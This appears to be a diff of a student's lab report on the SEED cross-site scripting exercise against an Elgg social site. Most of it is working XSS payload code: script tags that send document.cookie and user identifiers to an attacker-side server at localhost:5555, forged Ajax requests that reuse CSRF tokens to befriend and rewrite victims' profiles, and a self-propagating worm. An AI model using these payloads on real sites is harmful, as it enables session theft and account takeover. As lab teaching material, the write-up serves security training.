@@ -45,17 +45,8 @@
     [[./screenshots/task-2-display-cookie.png]]
 
 
-* Task 3 
-    Since we are simulating the cookie stealing using a server, we are assuming localhost is the host machine setup by the attacker. 
-** Insert malacious JS script tag in the about me section of profile
-#+BEGIN_SRC js
-    <script>document.write('<img src=http://localhost:5555?c='+escape(document.cookie)+'>');</script>
-#+END_SRC
-** Screenshot
-    j[[./screenshots/task-3-steal-cookie.png]]
-
-
-* Task 4
+    
+* Task 3
 ** Insert malacious JS script tag in the about me section of profile
 #+BEGIN_SRC js
   <script type="text/javascript">
@@ -85,7 +76,7 @@ from the victim's end.
 
 
 
-* Task 5
+* Task 4
 ** Insert malacious JS script tag in the about me section of profile
 #+BEGIN_SRC js
   <script type="text/javascript">
@@ -123,6 +114,46 @@ So with the line 1 we are guarding our injection so that, samy profile doesn't c
 [[./screenshots/task-5-samy-is-my-hero.png]]
 
 
+* Task 5
+** Insert malacious JS script tag in the about me section of profile
+#+BEGIN_SRC js
+  <script type="text/javascript">
+    window.onload = function () {
+      var username="&name="+elgg.session.user.name;
+      var guid="&guid="+elgg.session.user.guid;
+      var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; // 1
+      var token="&__elgg_token="+elgg.security.token.__elgg_token; // 2
+      var description='&description=<p>Samy is my hero<p>';
+
+      //Construct the HTTP requests
+      var sendurlFriend='http://www.seed-server.com/action/friends/add?friend=59'+ts+token; 
+      var sendurlProfile='http://www.seed-server.com/action/profile/edit';
+
+      //Create and send Ajax requests
+      var samyGuid=59;
+      if(elgg.session.user.guid!=samyGuid) { // 1
+        //Create and send Ajax request to modify profile
+        var Ajax=new XMLHttpRequest();
+        Ajax.open("POST", sendurlProfile, true);
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        var content=username+guid+ts+token+description;
+        Ajax.send(content);
+
+        Ajax=new XMLHttpRequest();
+        Ajax.open("GET", sendurlFriend, true);
+        Ajax.send();
+      }
+    }
+  </script>
+#+END_SRC
+
+Here when Alice visits Samy's profile a Samy will be automatically befriended with his profile visitor(victim).
+And her about me in the profile will be changed.
+
+** Screenshot
+    [[./screenshots/task-3-4.png]]
+
+
 * Task 6
 
 ** Insert malacious JS script tag in the about me section of profile
@@ -154,4 +185,81 @@ So with the line 1 we are guarding our injection so that, samy profile doesn't c
   </script>
 #+END_SRC
 
+  Here when someone visits samy's profile the code gets replicated into his description, and then when someone else visits infected persons profile
+  then his profile also gets infected and the worm spread in the internet.
 
+
+* Task 7
+** Insert malacious JS script tag in the about me section of profile
+#+BEGIN_SRC js
+  <script type="text/javascript">
+    window.onload = function() {
+      var username=elgg.session.user.username;
+      var settingsurl = `http://www.seed-server.com/settings/user/${username}`;
+      var Ajax=new XMLHttpRequest();
+      Ajax.onreadystatechange = () => {
+        if (Ajax.readyState === 4) {
+          (function(response) {
+              var isBoby = /elgg_boby@seed-labs.com/.test(response);
+              if (!isBoby) return;
+              var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+              var token="&__elgg_token="+elgg.security.token.__elgg_token;
+              var name="&name=Bola";
+              var sendurl='http://www.seed-server.com/action/usersettings/save';
+              var content=ts+token+name;
+              var AjaxI=new XMLHttpRequest();
+              AjaxI.open("POST", sendurl, true);
+              AjaxI.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+              AjaxI.send(content);
+          })(Ajax.response);
+        }
+      }
+      Ajax.open("GET", settingsurl, true);
+      Ajax.send();
+    }
+  </script>
+#+END_SRC
+
+  Here first we are checking whether the visitor is Boby by getting his email through settings page using Ajax. As we know Boby's email,
+  so we are checking whether its truely boby or not using the email address. The test is very crude in terms that it the search will return true
+  if it finds boby's email in settings page among many other things using regex. After we are confirmed that it is Boby, who is visiting Samy's
+  profile page, then we create a post request with display name 'Bola' and execute it.
+
+** Screenshots
+    [[./screenshots/task-7.png]]
+
+
+
+* Task 8 
+   Since we are simulating the cookie stealing using a server, we are assuming localhost is the host machine setup by the attacker. 
+** Insert malacious JS script tag in the about me section of profile
+#+BEGIN_SRC js
+    <script>document.write('<img src=http://localhost:5555?c='+escape(document.cookie)+'>');</script>
+#+END_SRC
+** Screenshot
+    [[./screenshots/task-3-steal-cookie.png]]
+
+
+* Task 9
+    Since we are simulating the cookie stealing using a server, we are assuming localhost is the host machine setup by the attacker. 
+** Insert malacious JS script tag in the about me section of profile
+#+BEGIN_SRC js
+  <script type="text/javascript">
+    window.onload = function() {
+      var username="&name="+elgg.session.user.name;
+      var guid="&guid="+elgg.session.user.guid;
+      var url="http://localhost:5555?"+username+guid;
+
+      var Ajax=new XMLHttpRequest();
+      Ajax.open("GET", url, true);
+      Ajax.send();
+    }
+  </script>
+#+END_SRC
+
+** Screenshot
+[[./screenshots/task-9.png]]
+
+
+
+* Task 10
